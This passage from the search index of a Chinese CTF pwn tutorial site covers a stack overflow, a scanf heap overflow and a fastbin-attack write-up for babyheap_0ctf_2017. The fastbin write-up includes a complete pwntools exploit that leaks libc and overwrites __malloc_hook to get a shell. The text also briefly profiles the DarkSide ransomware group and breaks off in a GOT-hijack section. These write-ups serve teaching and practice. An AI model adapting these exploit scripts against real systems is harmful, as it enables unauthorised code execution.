\u5730\u5740\nnum = 3281697\npayload = b'A'*0x20 + p64(num)\n\nsh.sendlineafter('input :',payload)\nsh.recvuntil('you :\\n0x')\n\nmain_addr = int(sh.recv(12),16)\n\n# \u518d\u6b21\u901a\u8fc7\u8f93\u5165\u5185\u5bb9\u6ea2\u51fa\uff0c\u5c06\u51fd\u6570\u8fd4\u56de\u5730\u5740\u6539\u4e3a shellcode \u5730\u5740\nshellcode_addr = main_addr + 0x202040 - 0xa33\npayload2 = b'A'*(0x30+8) + p64(shellcode_addr)\n\nsh.sendlineafter('input :',payload2)\nsh.interactive()\n</code></pre>"},{"location":"Pwn/Chapter6/","title":"Index","text":""},{"location":"Pwn/Chapter6/#darkside","title":"DarkSide","text":"<p>DarkSide \u57fa\u672c\u53ea\u9488\u5bf9\u82f1\u8bed\u56fd\u5bb6\u53d1\u52a8\u7f51\u7edc\u88ad\u51fb</p> <p>DarkSide \u7684\u52d2\u7d22\u8f6f\u4ef6\u5c06\u9ed8\u8ba4\u8bed\u8a00\u8bbe\u7f6e\u4e3a\u4fc4\u8bed\u3001\u4e4c\u514b\u5170\u8bed\u3001\u683c\u9c81\u5409\u4e9a\u8bed\u6216\u767d\u4fc4\u7f57\u65af\u8bed\u7684\u8ba1\u7b97\u673a\u5217\u4e3a\u767d\u540d\u5355\uff0c\u8fd9\u4e9b\u7535\u8111\u4e0d\u4f1a\u88ab\u8be5\u9ed1\u5ba2\u7ec4\u7ec7\u7684\u52d2\u7d22\u8f6f\u4ef6\u653b\u51fb</p> <p>\u5728 DarkSide \u7f51\u7ad9\u7684\u4e00\u4efd\u65b0\u95fb\u7a3f\u4e2d\uff0c\u8be5\u7ec4\u7ec7\u58f0\u79f0\u4ed6\u4eec\u4e0d\u4f1a\u653b\u51fb\u533b\u9662\u3001\u5b89\u5b81\u533b\u9662\u3001\u5b66\u6821\u3001\u5927\u5b66\u3001\u975e\u8425\u5229\u7ec4\u7ec7\u6216\u653f\u5e9c\u90e8\u95e8\u3002\u8be5\u7ec4\u7ec7\u8981\u6c42\u7684\u8d4e\u91d1\u4e00\u822c\u5728 20 \u4e07\u7f8e\u5143\u81f3 200 \u4e07\u7f8e\u5143\u8303\u56f4\u4e4b\u5185\u3002DarkSide \u8fd8\u58f0\u79f0\u4ed6\u4eec\u4f1a\u5c06\u90e8\u5206\u8d4e\u91d1\u6350\u8d60\u7ed9\u6148\u5584\u673a\u6784</p> <p>2020\u5e748\u6708\uff0c\u4eba\u4eec\u9996\u6b21\u6ce8\u610f\u5230\u8be5\u9ed1\u5ba2\u7ec4\u7ec7</p> <p></p>"},{"location":"Pwn/Chapter6/6-1/","title":"Scanf \u5806\u6ea2\u51fa\u8986\u76d6\u76f8\u90bb\u5806\u5757","text":""},{"location":"Pwn/Chapter6/6-1/#scanf-\u5806\u6ea2\u51fa\u8986\u76d6\u76f8\u90bb\u5806\u5757","title":"Scanf \u5806\u6ea2\u51fa\u8986\u76d6\u76f8\u90bb\u5806\u5757","text":"<p>\u9996\u5148\u770b\u6e90\u4ee3\u7801\u62ff\u5230 flag \u7684\u6761\u4ef6</p> <pre><code>void check_win() {\n    if (strcmp(safe_var, \"bico\") != 0) {\n        printf(\"\\nYOU WIN\\n\");\n\n        // Print flag\n        char buf[FLAGSIZE_MAX];\n        FILE *fd = fopen(\"flag.txt\", \"r\");\n        fgets(buf, FLAGSIZE_MAX, fd);\n        printf(\"%s\\n\", buf);\n        fflush(stdout);\n\n        exit(0);\n    } else {\n        printf(\"Looks like everything is still secure!\\n\");\n        printf(\"\\nNo flag for you :(\\n\");\n        fflush(stdout);\n    }\n}\n</code></pre> <p>\u7528\u6237\u8f93\u5165\u7684\u51fd\u6570</p> <p>\u8fd9\u91cc\u7684\u51fd\u6570 <code>scanf</code> \u662f**\u6f0f\u6d1e\u5229\u7528\u7684\u5173\u952e**</p> <p>\u7531\u4e8e <code>scanf</code> \u7f3a\u4e4f\u8fb9\u754c\u68c0\u67e5\uff0c\u5b83\u53ef\u4ee5\u6ea2\u51fa <code>input_data</code> \u7f13\u51b2\u533a\uff0c\u8ba9\u6211\u4eec\u80fd\u591f\u8986\u76d6\u76f8\u90bb\u7684\u5185\u5b58\u4f4d\u7f6e\uff0c\u5305\u62ec <code>safe_var</code></p> <pre><code>void write_buffer() {\n    printf(\"Data for buffer: \");\n    fflush(stdout);\n    scanf(\"%s\", input_data);\n}\n</code></pre> <p>\u5f00\u5934\u4f1a\u6253\u5370\u51fa\u4e24\u4e2a\u5806\u5757\u7684\u5730\u5740\uff0c\u76f8\u51cf\u5f97\u5230\u504f\u79fb 32</p> <p></p> <p>\u751f\u6210\u5927\u4e8e 32 \u4e2a\u7684\u968f\u673a\u5b57\u7b26\u4e32\u8f93\u5165\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter6/6-2/","title":"Fastbin Attack\uff08\u4e24\u6b21 Double Free\uff09","text":""},{"location":"Pwn/Chapter6/6-2/#fastbin-attack\u4e24\u6b21-double-free","title":"Fastbin Attack\uff08\u4e24\u6b21 Double Free\uff09","text":"<p>\u5148 checksec \u4e00\u4e0b\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00</p> <p></p> <p>\u7b80\u5355\u6ce8\u91ca\u4e00\u4e0b\u529f\u80fd</p> <p></p> <p>\u5728\u7f16\u8f91\u51fd\u6570\u4e2d\u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u5229\u7528\u601d\u8def\uff1a</p> <ol> <li>\u4e24\u6b21 double free \u4e0e fastbin attack</li> <li>\u7b2c\u4e00\u6b21\u5148\u6cc4\u9732 libc \u5730\u5740\uff0c\u7136\u540e\u627e\u5230\u6784\u9020 fake chunk \u7684\u5730\u5740</li> <li>\u7b2c\u4e8c\u6b21\u901a\u8fc7\u6784\u9020\u7684 fake chunk \u5806\u6ea2\u51fa\u8986\u5199 __malloc_hook \u5b8c\u6210 get shell</li> </ol> <p>\u9996\u5148\u901a\u8fc7 unsortedbin attack  \u6765\u6cc4\u9732 libc \u5730\u5740</p> <p>\u5e94\u8be5\u8bb0\u4f4f\u8fd9\u6837\u4e00\u6761\u89c4\u5f8b\uff1a\u5f53 small chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u7684 fd\u3001bk \u6307\u5411\u4e00\u4e2a\u6307\u9488\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411 top chunk \u5730\u5740</p> <p>\u8fd9\u4e2a\u6307\u9488\u4fdd\u5b58\u5728 main_arena \u7684 0x58 \u504f\u79fb\u5904\uff0c\u800c main_arena \u662f libc \u7684 data \u6bb5\u4e2d\uff0c\u662f\u5168\u5c40\u9759\u6001\u53d8\u91cf\uff0c\u6240\u4ee5\u504f\u79fb\u4e5f\u662f\u56fa\u5b9a\u7684</p> <p>\u6839\u636e\u8fd9\u4e9b\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa libc \u7684\u57fa\u5730\u5740\u4e86\uff0c\u6240\u4ee5\u91cd\u70b9\u662f\u5f53 small chunk \u91ca\u653e\u65f6\uff0c\u80fd\u8bfb\u51fa fd \u6216\u8005 bk \u7684\u503c</p> <p>1. \u5806\u5185\u5b58\u7ba1\u7406\u7b80\u4ecb</p> <p>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0cglibc \u4f7f\u7528 ptmalloc2 \u4f5c\u4e3a\u9ed8\u8ba4\u7684\u5185\u5b58\u5206\u914d\u5668</p> <p>ptmalloc2 \u901a\u8fc7\u7ef4\u62a4\u591a\u4e2a bin\uff08\u5982 fastbin\u3001small bin\u3001unsorted bin\u3001large bin \u7b49\uff09\u6765\u7ba1\u7406\u5806\u5185\u5b58</p> <p>\u6bcf\u4e2a bin \u7528\u4e8e\u7ba1\u7406\u4e0d\u540c\u5927\u5c0f\u7684\u5185\u5b58\u5757\uff08chunk\uff09</p> <p>2. unsorted bin \u548c small chunk</p> <ul> <li>unsorted bin\uff1a\u5f53\u5185\u5b58\u5757\u88ab\u91ca\u653e\u65f6\uff0c\u5982\u679c\u4e0d\u662f fastbin \u5927\u5c0f\uff0c\u5b83\u9996\u5148\u4f1a\u88ab\u653e\u5165 unsorted bin\uff0cunsorted bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u7528\u4e8e\u4e34\u65f6\u5b58\u653e\u91ca\u653e\u7684\u5185\u5b58\u5757\uff0c\u7b49\u5f85\u540e\u7eed\u7684\u5206\u914d\u6216\u5408\u5e76</li> <li>small chunk\uff1asmall chunk \u662f\u6307\u5927\u5c0f\u5c0f\u4e8e 512 \u5b57\u8282\uff0832 \u4f4d\u7cfb\u7edf\uff09\u6216 1024 \u5b57\u8282\uff0864 \u4f4d\u7cfb\u7edf\uff09\u7684\u5185\u5b58\u5757\uff0csmall chunk \u88ab\u91ca\u653e\u540e\u4f1a\u8fdb\u5165 small bin \u6216 unsorted bin</li> </ul> <p>3. main_arena \u548c libc</p> <ul> <li>main_arena\uff1a\u662f ptmalloc2 \u4e2d\u7528\u4e8e\u7ba1\u7406\u5806\u5185\u5b58\u7684\u4e3b\u8981\u7ed3\u6784\u4f53\uff0c\u5b83\u5305\u542b\u4e86\u5404\u79cd bin \u7684\u4fe1\u606f\uff0cmain_arena \u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc \u7684 data \u6bb5\u4e2d</li> <li>libc\uff1a\u662f Linux \u7cfb\u7edf\u4e2d\u7684 C \u6807\u51c6\u5e93\uff0c\u5305\u542b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u5b9e\u73b0\uff0clibc \u7684\u57fa\u5730\u5740\u662f\u968f\u673a\u7684\uff08\u7531\u4e8e ASLR\uff0c\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff09\uff0c\u4f46\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u662f\u56fa\u5b9a\u7684</li> </ul> <p>4. unsorted bin attack \u6cc4\u9732 libc \u5730\u5740</p> <p>\u5f53 small chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u4f1a\u88ab\u653e\u5165 unsorted bin \u6216 small bin \u4e2d\uff0c\u6b64\u65f6\uff0cchunk \u7684 <code>fd</code> \u548c <code>bk</code> \u6307\u9488\u4f1a\u6307\u5411 main_arena \u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u5177\u4f53\u6765\u8bf4\uff1a</p> <ul> <li><code>fd</code> \u548c <code>bk</code> \u4f1a\u6307\u5411 main_arena \u4e2d\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411 top chunk \u7684\u5730\u5740</li> <li>\u8fd9\u4e2a\u6307\u9488\u5728 main_arena \u4e2d\u7684\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff08\u4f8b\u5982\uff0c0x58 \u504f\u79fb\u5904\uff09</li> </ul> <p>\u7531\u4e8e main_arena \u662f libc \u4e2d\u7684\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b83\u7684\u5730\u5740\u4e0e libc \u7684\u57fa\u5730\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u80fd\u591f\u8bfb\u53d6 small chunk \u7684 <code>fd</code> \u6216 <code>bk</code> \u6307\u9488\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa main_arena \u7684\u5730\u5740\uff0c\u8fdb\u800c\u8ba1\u7b97\u51fa libc \u7684\u57fa\u5730\u5740</p> <p>\u63d0\u53d6\u7533\u8bf7\u51e0\u4e2a\u5c0f\u5806\u5757</p> <pre><code>alloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x80)\n\ngdb.attach(p)\n</code></pre> <p></p> <p>\u518d\u91ca\u653e\u6389\u4e24\u4e2a fast bin</p> <pre><code>free(1)\nfree(2)\n\ngdb.attach(p)\n</code></pre> <p>\u8f93\u5165 bins \u67e5\u770b\u6240\u6709\u79cd\u7c7b\u7684\u5806\u5757\u7684\u94fe\u8868\u60c5\u51b5</p> <p></p> <p>LIFO \u662f fastbin \u7684\u4e00\u4e2a\u91cd\u8981\u7279\u6027\uff0c\u8868\u793a \u540e\u8fdb\u5148\u51fa\uff08Last In, First Out\uff09</p> <p>\u8fd9\u610f\u5473\u7740\uff1a</p> <ul> <li>\u5f53\u91ca\u653e\u4e00\u4e2a chunk \u5230 fastbin \u65f6\uff0c\u5b83\u4f1a\u88ab\u63d2\u5165\u5230\u94fe\u8868\u7684\u5934\u90e8</li> <li>\u5f53\u5206\u914d\u4e00\u4e2a chunk \u65f6\uff0c\u4f1a\u4ece\u94fe\u8868\u7684\u5934\u90e8\u53d6\u51fa\u6700\u8fd1\u91ca\u653e\u7684 chunk</li> </ul> <p>fastbin \u662f glibc \u4e2d\u7528\u4e8e\u7ba1\u7406\u5c0f\u5185\u5b58\u5757\uff08\u901a\u5e38\u5c0f\u4e8e 64 \u5b57\u8282\uff09\u7684\u4e00\u79cd bin</p> <p>fastbin \u662f\u4e00\u4e2a\u5355\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u7a7a\u95f2 chunk \u901a\u8fc7 <code>fd</code> \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a\u7a7a\u95f2 chunk</p> <p>\u7531\u4e8e\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8986\u76d6\u540e\u8fb9\u7684\u5185\u5b58\u3002\u6211\u4eec\u628a chunk 2 \u7684\u5185\u5bb9\u8986\u76d6\u4e3a chunk 4 \u7684\u5730\u5740</p> <p>\u5c06\u5982\u56fe\u6807\u8bb0\u5904\u4fee\u6539\u4e3a chuk4 \u7684\u5730\u5740\uff0c\u53ea\u7528\u4fee\u6539\u4f4e 8 \u5b57\u8282\u5373\u53ef</p> <p></p> <pre><code># +-------------------+-------------------+-------------------+-------------------+\n# |   Chunk 0 (idx=0) |   Chunk 1 (idx=1) |   Chunk 2 (idx=2) |   Chunk 3 (idx=3) |\n# +-------------------+-------------------+-------------------+-------------------+\npayload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)\n\nfill(0, payload)\n\ngdb.attach(p)\n</code></pre> <p>\u4fee\u6539\u540e</p> <p></p> <p>\u73b0\u5728 chunk2 \u7684 fd \u6307\u5411\u4e86 chunk4\uff0c\u8fd9\u6837\u76f8\u5f53\u4e8e chunk 4 \u5df2\u7ecf\u88ab free \u4e86\u800c\u4e14\u88ab\u5b58\u653e\u5728 fastbin \u4e2d</p> <p></p> <p>\u6211\u4eec\u7b49\u4e0b\u8981 malloc \u56de chunk 4 \uff0c\u53ef\u662f malloc fastbin \u6709\u68c0\u67e5</p> <p>\u5f53\u4ece fastbin \u4e2d\u5206\u914d chunk \u65f6\uff0cglibc \u4f1a\u68c0\u67e5 chunk \u7684 <code>size</code> \u5b57\u6bb5\u662f\u5426\u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u7c7b\u522b\u5339\u914d</p> <p>\u6240\u4ee5\u6211\u4eec\u8986\u76d6 chunk 4 \u7684 size \u4e3a fastbin \u5927\u5c0f\u6765\u901a\u8fc7\u68c0\u67e5</p> <p>\u7136\u540e\u901a\u8fc7\u4e24\u6b21(\u56e0\u4e3a fast bin \u662f\u5355\u94fe\u8868) malloc\uff0c\u5c31\u53ef\u4ee5 small chunk \u653e\u5165 fast bin \u4e2d\u4e86</p> <pre><code>payload = p64(0) * 3 + p64(0x21)\n\nfill(3, payload)\n\nalloc(0x10)\nalloc(0x10)\n\ngdb.attach(p)\n</code></pre> <p>chunk4 \u88ab\u6211\u4eec\u4fee\u6539\u6210\u4e86 fastbin</p> <p></p> <p>\u8fd9\u6837\u5c31\u6709\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a chunk \u4e86\uff0c\u7136\u540e\u6062\u590d\u5176 size \u5927\u5c0f\uff0c\u7533\u8bf7\u56de\u6765\u5728\u91ca\u653e\u6389(\u91ca\u653e\u65f6\uff0c\u662f\u5f53\u505a small bin \u91ca\u653e\u7684)</p> <p>\u63a5\u7740\u67e5\u770b\u5bf9\u5e94 chunk \u7684 index \u5c31\u597d\u4e86</p> <pre><code>payload = p64(0) * 3 + p64(0x91)\n\nfill(3, payload)\n\nalloc(0x80)\n\nfree(4)\n\ngdb.attach(p)\n</code></pre> <p></p>"},{"location":"Pwn/Chapter6/6-2/#unsorted-bin-\u7684\u7279\u6027","title":"unsorted bin \u7684\u7279\u6027","text":"<ul> <li>unsorted bin \u662f glibc \u4e2d\u7528\u4e8e\u7ba1\u7406\u91ca\u653e\u7684\u5185\u5b58\u5757\u7684\u4e00\u79cd bin</li> <li>\u5b83\u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u7a7a\u95f2 chunk \u901a\u8fc7 <code>fd</code>\uff08forward pointer\uff09\u548c <code>bk</code>\uff08backward pointer\uff09\u6307\u9488\u94fe\u63a5</li> <li>\u5f53 unsorted bin \u4e2d\u53ea\u6709\u4e00\u4e2a chunk \u65f6\uff0c\u5b83\u7684 <code>fd</code> \u548c <code>bk</code> \u6307\u9488\u4f1a\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\uff0c\u5373 unsorted bin \u94fe\u8868\u7684\u5934\u90e8\uff08main_arena + 0x58\uff09</li> </ul>"},{"location":"Pwn/Chapter6/6-2/#main_arena-\u548c-libc-\u7684\u5173\u7cfb","title":"main_arena \u548c libc \u7684\u5173\u7cfb","text":"<ul> <li>main_arena \u662f glibc \u4e2d\u7528\u4e8e\u7ba1\u7406\u5806\u5185\u5b58\u7684\u4e3b\u8981\u7ed3\u6784\u4f53\uff0c\u5b83\u5305\u542b\u4e86\u5404\u79cd bin \u7684\u4fe1\u606f</li> <li>main_arena \u662f libc \u4e2d\u7684\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc \u7684 data \u6bb5\u4e2d</li> <li>main_arena \u7684\u5730\u5740\u76f8\u5bf9\u4e8e libc \u57fa\u5730\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb\uff08\u5982 <code>0x3c4b20</code>\uff09</li> </ul> <p>\u8fd9\u4e2a\u5730\u5740\u4e3a main_arena + 0x58 \uff0c\u800c\u4e14 main_arena \u53c8\u76f8\u5bf9 libc \u56fa\u5b9a\u504f\u79fb 0x3c4b20</p> <p>\u6240\u4ee5\u5f97\u5230\u8fd9\u4e2a fd \u7684\u503c\uff0c\u7136\u540e\u51cf\u53bb 0x58 \u518d\u51cf\u53bb main_arena \u76f8\u5bf9\u4e8e libc \u7684\u56fa\u5b9a\u504f\u79fb\uff0c\u5373\u5f97\u5230 libc \u7684\u57fa\u5730\u5740</p> <pre><code># 0x3c4b78?\n# libc_base=\uff08\u7a0b\u5e8f\u91cc\u7684 main_arena+88\uff09-0x3c4b78(0x3c4b0+88,\u4e00\u822c 2.23_64 \u7684\u504f\u79fb\u90fd\u662f\u8fd9\u4e2a\uff0c\u4e0d\u540c libc \u7248\u672c\u4f1a\u6709\u4e0d\u540c)\n\n# index=2?\n# \u7531\u4e8e\u6211\u4eec\u521a\u521a\u628a chunk 2 \u7684 fd \u6307\u9488\u6539\u4e3a chunk 4 \u7684\u5730\u5740\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21 malloc(0x10) \u7684\u65f6\u5019\u662f\u5206\u914d\u7684\u539f\u6765 chunk 2 \u7684\u5757\u7ed9 index 1\uff0c\u7b2c\u4e8c\u6b21 malloc(0x10) \u7684\u65f6\u5019\u5c31\u4f1a\u5206\u914d chunk 4 \u7684\u5757\u7ed9 index 2\uff0c\u4e5f\u5c31\u662f\u8bf4 index 2 \u4e0e index 4 \u7684\u5185\u5bb9\u90fd\u662f chunk 4\n\n\nlibc_base = u64(dump(2)[:8].strip().ljust(8, b\"\\x00\")) - 0x3c4b78\n</code></pre>"},{"location":"Pwn/Chapter6/6-2/#malloc_hook-\u7684\u4f5c\u7528","title":"malloc_hook \u7684\u4f5c\u7528","text":"<ul> <li>malloc_hook \u662f libc \u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u4f4d\u4e8e libc \u7684 data \u6bb5</li> <li>\u5f53\u8c03\u7528 <code>malloc</code> \u65f6\uff0c\u5982\u679c <code>malloc_hook</code> \u4e0d\u4e3a\u7a7a\uff0c\u5219\u4f1a\u6267\u884c <code>malloc_hook</code> \u6307\u5411\u7684\u51fd\u6570</li> <li>\u901a\u8fc7\u4fee\u6539 <code>malloc_hook</code>\uff0c\u53ef\u4ee5\u52ab\u6301 <code>malloc</code> \u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4ece\u800c\u5b9e\u73b0 getshell</li> </ul>"},{"location":"Pwn/Chapter6/6-2/#fastbin-attack-\u7684\u57fa\u672c\u539f\u7406","title":"fastbin attack \u7684\u57fa\u672c\u539f\u7406","text":"<ul> <li>fastbin attack \u662f\u4e00\u79cd\u5806\u6f0f\u6d1e\u5229\u7528\u6280\u672f\uff0c\u901a\u8fc7\u64cd\u63a7 fastbin \u94fe\u8868\uff0c\u5c06\u4efb\u610f\u5730\u5740\u653e\u5165 fastbin \u4e2d\uff0c\u7136\u540e\u901a\u8fc7 <code>malloc</code> \u5206\u914d\u8be5\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199</li> <li>\u5177\u4f53\u6b65\u9aa4\uff1a</li> <li>\u901a\u8fc7\u5806\u6ea2\u51fa\u6216\u5176\u4ed6\u6f0f\u6d1e\uff0c\u4fee\u6539\u67d0\u4e2a fastbin chunk \u7684 <code>fd</code> \u6307\u9488\uff0c\u4f7f\u5176\u6307\u5411\u76ee\u6807\u5730\u5740\uff08\u5982 <code>malloc_hook</code> \u7684\u5730\u5740\uff09</li> <li>\u901a\u8fc7 <code>malloc</code> \u5206\u914d chunk\uff0c\u5c06\u76ee\u6807\u5730\u5740\u5206\u914d\u51fa\u6765</li> <li>\u5411\u5206\u914d\u7684\u5185\u5b58\u4e2d\u5199\u5165\u6570\u636e\uff0c\u4ece\u800c\u4fee\u6539\u76ee\u6807\u5730\u5740\u7684\u5185\u5bb9\uff08\u5982\u5c06 <code>malloc_hook</code> \u4fee\u6539\u4e3a <code>one_gadget</code> \u7684\u5730\u5740\uff09</li> </ul> <p>\u83b7\u5f97\u4e86 libc \u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fastbin attack \u5c06\u4e00\u4e2a libc \u4e0a\u7684\u5730\u5740\u653e\u5165 fastbin \u94fe\u8868\u4e2d</p> <p>\u7136\u540e malloc \u51fa\u6765\uff0c\u8fd9\u6837\u5c31\u53ef\u5df2\u6539\u5199 libc \u7684\u5185\u5bb9</p> <p>malloc_hook \u662f\u4e00\u4e2a libc \u4e0a\u7684\u51fd\u6570\u6307\u9488\uff0c\u8c03\u7528 malloc \u65f6\u5982\u679c\u8be5\u6307\u9488\u4e0d\u4e3a\u7a7a\u5219\u6267\u884c\u5b83\u6307\u5411\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u5199 malloc_hook \u6765 getshell</p> <p>\u540c\u6837\u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u8981\u7ed5\u8fc7 malloc \u7684\u5b89\u5168\u68c0\u67e5\uff0cchunksize \u5fc5\u987b\u4e0e fastbin_index \u76f8\u5bf9\u5e94</p> <p>\u521d\u770b __malloc_hook \u9644\u8fd1\u6ca1\u6709\u5408\u9002\u7684 chunksize\uff0c\u8fd9\u91cc\u9700\u8981\u5de7\u5999\u7684\u504f\u79fb\u4e00\u4e0b</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u5728 0x7f2a8a09eaed \u5904\u6784\u9020\u5757\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\uff08\u56e0\u4e3a 7f \u6ee1\u8db3 0x70 \u5927\u5c0f\uff09</p> <p>\u53ef\u4ee5\u8ba1\u7b97 0x7f2a8a09eaed \u8ddd\u79bb libc \u57fa\u5740\u7684\u504f\u79fb\u4e3a 0x3c4aed</p> <pre><code>alloc(0x60)\n\nfree(4)\n\npayload = p64(libc_base+0x3c4aed)\n\nfill(2, payload)\n\ngdb.attach(p)\n</code></pre> <p>\u63a5\u7740\u5c06 malloc_hook \u6539\u4e3a one_gadget\uff0c\u8fd9\u6837\u6211\u4eec\u5728 malloc \u7684\u65f6\u5019\u5c31\u80fd\u591f\u83b7\u53d6 shell \u4e86</p> <pre><code>alloc(0x60)\nalloc(0x60)\n\npayload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + 0x4526a)\n\nfill(6, payload)\n\nalloc(255)\n\ngdb.attach(p)\n</code></pre> <p>\u5b8c\u6574 payload\uff1a</p> <pre><code>from pwn import *\nimport sys\n\n\nelf = ELF(\"./babyheap_0ctf_2017\")\nlibc = ELF(\"./libc-2.23.so\")\np = remote('node5.buuoj.cn',27132)\n\ndef alloc(size):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"1\")\n    p.recvuntil(\"Size: \")\n    p.sendline(str(size))\n\n\ndef fill(idx, content):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"2\")\n    p.recvuntil(\"Index: \")\n    p.sendline(str(idx))\n    p.recvuntil(\"Size: \")\n    p.sendline(str(len(content)))\n    p.recvuntil(\"Content: \")\n    p.send(content)\n\n\ndef free(idx):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"3\")\n    p.recvuntil(\"Index: \")\n    p.sendline(str(idx))\n\n\ndef dump(idx):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"4\")\n    p.recvuntil(\"Index: \")\n    p.sendline(str(idx))\n    p.recvline()\n    return p.recvline()\n\n\nalloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x80)\n\nfree(1)\nfree(2)\n\npayload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)\n\nfill(0, payload)\n\npayload = p64(0) * 3 + p64(0x21)\n\nfill(3, payload)\n\nalloc(0x10)\nalloc(0x10)\n\npayload = p64(0) * 3 + p64(0x91)\n\nfill(3, payload)\n\nalloc(0x80)\n\nfree(4)\n\nlibc_base = u64(dump(2)[:8].strip().ljust(8, b\"\\x00\")) - 0x3c4b78\n\nalloc(0x60)\n\nfree(4)\n\npayload = p64(libc_base + 0x3c4aed)\n\nfill(2, payload)\n\nalloc(0x60)\nalloc(0x60)\n\npayload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + 0x4526a)\n\nfill(6, payload)\n\nalloc(255)\n\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter6/6-3/","title":"Fastbin Attack\uff08\u4f2a\u9020\u5806\u5757\u52ab\u6301 GOT \u8868\uff09","text":""},{"location":"Pwn/Chapter6/6-3/#fastbin-attack\u4f2a\u9020\u5806\u5757\u52ab\u6301-got-\u8868","title":"Fastbin Attack\uff08\u4f2a\u9020\u5806\u5757\u52ab\u6301 GOT \u8868\uff09","text":"<p>\u5148 checksec</p> <p></p> <p>\u4e00\u4e2a\u5806\u83dc\u5355</p> <p></p> <p>\u63d0\u4f9b\u4e86\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u6f0f\u6d1e\u51fd\u6570\u4f4d\u4e8e\u521b\u5efa\u51fd\u6570\u4e2d</p> <p>\u8fd9\u8fb9 size \u7684\u5927\u5c0f\u7531\u6211\u4eec\u8f93\u5165\u63a7\u5236</p> <p>heaparray \u6570\u7ec4\u5728 bss \u6bb5\u4e0a\u5b58\u653e\u7740\u6211\u4eec chunk \u7684\u6307\u9488</p> <p></p> <p>edit \u7b80\u5355\u7684\u6839\u636e\u6307\u9488\u4fee\u6539\u5bf9\u5e94 chunk \u91cc\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u91cc\u7684 size \u4e5f\u662f\u7531\u6211\u4eec\u624b\u52a8\u8f93\u5165\u7684</p> <p>\u4e5f\u5c31\u662f\u8bf4\u53ea\u8981\u6211\u4eec\u8fd9\u8fb9\u8f93\u5165\u7684 size \u6bd4 add \u7684\u65f6\u5019\u8f93\u5165\u7684 size \u5927\u5c31\u4f1a\u9020\u6210\u6ea2\u51fa</p> <p></p> <p>\u5148\u7533\u8bf7\u51e0\u4e2a\u5806\u5757</p> <pre><code>add(0x60,\"happy\")\nadd(0x60,\"happy\")\nadd(0x60,\"happy\")\n\ngdb.attach(io)\n</code></pre> <p></p> <p>\u73b0\u5728\u91ca\u653e\u7b2c\u4e09\u4e2a\u5806\u5757\u8ba9\u5176\u8fdb\u5165 fastbin</p> <pre><code>delete(2)\n\ngdb.attach(io)\n</code></pre> <p></p> <p>\u4fee\u6539 heap1 \u5185\u5bb9\u4e3a '/bin/sh\\x00'\uff0811 \u5b57\u8282\uff09\uff0c\u518d\u586b\u5145 60 \u5b57\u8282\u5783\u573e\u6570\u636e</p> <p>\u5806\u6ea2\u51fa heap2(freed) \u4fee\u6539\u5176 fd \u6307\u9488</p> <p>\u56e0\u4e3a\u6700\u540e\u91ca\u653e\u7684\u662f heap1,\u5229\u7528 '__free_hook'(system) Getshell</p> <p>\u4e3a\u4ec0\u4e48\u662f 0x6020ad</p> <p>FakeChunk \u82e5\u4ee5\u8fd9\u91cc\u4e3a prev_size\uff0c\u5219 size \u6b63\u597d\u662f\u4e00\u4e2a 0x7f</p> <p>\u53ef\u4ee5\u7ed5\u8fc7 malloc_chunk 